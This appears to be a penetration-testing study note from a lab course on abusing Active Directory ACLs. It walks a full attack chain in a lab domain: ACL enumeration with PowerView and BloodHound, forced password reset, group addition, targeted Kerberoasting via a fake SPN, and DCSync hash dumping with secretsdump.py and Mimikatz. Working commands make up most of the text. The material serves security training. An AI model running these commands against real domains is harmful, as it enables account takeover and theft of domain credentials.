- [ACLs - ACEs Abuse](#acls---aces-abuse)
- [ACL Enumeration](#acl-enumeration)
    - [Enumerating ACLs with PowerView](#enumerating-acls-with-powerview)
    - [Enumerating ACLs with BloodHound](#enumerating-acls-with-bloodhound)
- [Abusing ACLs](#abusing-acls)
- [DCSync](#dcsync)


## ACLs - ACEs Abuse
- **Overview**
    - ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called Access Control Entries (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD.

- There are 2 types of ACLs: 
    1. Discretionary Access Control List (DACL):
        - Think of this as a "permission list" for an object (like a file or folder). It decides who can access it and what they are allowed to do (read, write, delete, etc.). Here's how it works:

        - ACE (Access Control Entry): These are the rules in the list, like "User A can read," or "User B cannot write."
        - When someone tries to access the object, the system checks the DACL to see what they are allowed to do.
        - If there’s no DACL, it’s as if the door is wide open—everyone has full access.
        - If the DACL exists but is empty (no rules), the door is locked—no one can get in.
    2. System Access Control List (SACL):
        - This is like a "security camera log." It doesn't control access but keeps a record of who tried to access the object and what they tried to do. It’s useful for administrators who want to track or monitor suspicious activity or failed access attempts.
        
- In short:

    - DACL = Controls "who can do what."
    - SACL = Tracks "who tried to do what."

- Example: ![DACL_example](/images/DACL_example.jpg)
    - Each item under Permission entries makes up the DACL for the user account, while the individual entries (such as Full Control or Change Password) are ACE entries showing rights granted over this user object to various users and groups.
    - The SACLs can be seen within the Auditing tab.


- **Access Control Entries (ACEs)**
    - Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are three main types of ACEs that can be applied to all securable objects in AD:

    |ACE	| Description|
    |:------|:-----------|
    |Access denied ACE|	Used within a DACL to show that a user or group is explicitly denied access to an object|
    |Access allowed ACE|	Used within a DACL to show that a user or group is explicitly granted access to an object|
    |System audit ACE|	Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred|

    - Each ACE is made up of the following four components:

        - The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
        - A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
        - A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object
        - An access mask which is a 32-bit value that defines the rights granted to an object

![ACL Attacks Graphic](/images/ACL_attacks_graphic.jpg)

### ACL Enumeration
#### Enumerating ACLs with PowerView

- Get the SID of our target user to search effectively.
```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley


```

- We can then use the `Get-DomainObjectACL` function to perform our targeted search. We are using this function to find all domain objects that our user has rights over by mapping the user's SID using the `$sid` variable to the `SecurityIdentifier` property which is what tells us who has the given right over an object.

```powershell
# Using Get-DomainObjectACL and -ResolveGUIDs Flag

PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

```
- **Alternatives for PowerView**  
    - Using the Get-Acl and Get-ADUser
        1. Creating a List of Domain Users: `PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt`
        2. A Useful foreach Loop: `PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}`
        3. Performing a Reverse Search & Mapping to a GUID Value. 
        ```powershell
        PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
        PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
        ```


```powershell
# Investigating the Help Desk Level 1 Group with Get-DomainGroup
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

#### Enumerating ACLs with BloodHound
![wley_damundsen](/images/wley_damundsen.jpg)

- We can set the wley user as our starting node, select the Node Info tab and scroll down to Outbound Control Rights. This option will show us objects we have control over directly, via group membership, and the number of objects that our user could lead to us controlling via ACL attack paths under Transitive Object Control. If we click on the 1 next to First Degree Object Control, we see the first set of rights that we enumerated, ForceChangePassword over the damundsen user.

- If we right-click on the line between the two objects, a menu will pop up. If we select Help, we will be presented with help around abusing this ACE, including:

    - More info on the specific right, tools, and commands that can be used to pull off this attack
    - Operational Security (Opsec) considerations
    - External references.

### Abusing ACLs
- Example:
    ![wley_path](/images/wley_path.jpg) 

    1. Use the wley user to change the password for the damundsen user
    2. Authenticate as the damundsen user and leverage GenericWrite rights to add a user that we control to the Help Desk Level 1 group
    3. Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user

1. 
    - So, first, we must authenticate as wley and force change the password of the user damundsen.
    ```powershell
    # Creating a PSCredential Object
    PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
    PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 

    ```
    - Next, we must create a `SecureString` object which represents the password we want to set for the target user damundsen.
    ```powershell
    # Creating a SecureString Object
    PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

    # Changing the User's Password
    PS C:\htb> Import-Module .\PowerView.ps1
    PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
    ```
2. 
    - Authenticate as the damundsen user and add ourselves to the Help Desk Level 1 group.
    ```powershell
    # Creating a SecureString Object using damundsen
    PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
    PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
    ```
    - We can first confirm that our user is not a member of the target group.
    ```powershell
    PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
    ```
    - We can use the `Add-DomainGroupMember` function to add ourselves to the target group.
    ```powershell
    PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

    # Confirming damundsen was Added to the Group
    PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

    ```

- adunn user is an admin account that cannot be interrupted. Since we have `GenericAll` rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's `servicePrincipalName` attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.

3. 
    - We can now use `Set-DomainObject` to create the fake SPN. We could use the tool [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.
    ```powershell
    # Creating a Fake SPN
    PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

    # Kerberoasting with Rubeus
    PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap

    ```
    - Great! We have successfully obtained the hash. The last step is to attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the adunn user and perform the DCSync attack.


#### Cleanup
- In terms of cleanup, there are a few things we need to do:

    1. Remove the fake SPN we created on the adunn user.
    2. Remove the damundsen user from the Help Desk Level 1 group
    3. Set the password for the damundsen user back to its original value (if we know it) or have our client set it/alert the user

- This order is important because if we remove the user from the group first, then we won't have the rights to remove the fake SPN.

```powershell
# Removing the Fake SPN from adunn's Account
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

# Removing damundsen from the Help Desk Level 1 Group
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose


# Confirming damundsen was Removed from the Group
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose


```

### DCSync
- We now have control over the user adunn who has DCSync privileges in the INLANEFREIGHT.LOCAL domain. 

- DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data.
- The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.

> [!NOTE]
> Domain/Enterprise Admins and default domain administrators have this right by default.

- Viewing adunn's Replication Privileges through ADSI Edit ![adnunn_right_dcsync](/images/adnunn_right_dcsync.jpg)

```powershell
# Using Get-DomainUser to View adunn's Group Membership
PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl


samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

# Using Get-ObjectAcl to Check adunn's Replication Rights
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
ObjectAceType         : DS-Replication-Get-Changes-All

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-All


```


- DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py.
- **Secretsdump.py**
    ```bash
    # Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
    abdeonix@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 


    ```
    - We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user.

    - Other useful options include -pwd-last-set to see when each account's password was last changed and -history if we want to dump password history


    - The `-user-status` is another helpful flag to check and see if a user is disabled.
    - If we check the files created using the `-just-dc` flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with reversible encryption enabled.
    - When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the Syskey) and can be extracted by a Domain Admin or equivalent. 
    - Tools such as secretsdump.py will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync.
    ```powershell
    # Enumerating Further using Get-ADUser
    PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

    DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
    Enabled            : True
    GivenName          :
    Name               : PROXYAGENT
    ObjectClass        : user
    ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
    SamAccountName     : proxyagent
    SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
    Surname            :
    userAccountControl : 640
    UserPrincipalName  :

    # Checking for Reversible Encryption Option using Get-DomainUser
    PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

    samaccountname                         useraccountcontrol
    --------------                         ------------------
    proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT

    ```

- **Using Mimikatz**
    ```bat
    # Using runas.exe
    C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell

    # Performing the Attack with Mimikatz
    PS C:\htb> .\mimikatz.exe
    mimikatz # privilege::debug
    mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

    ```
  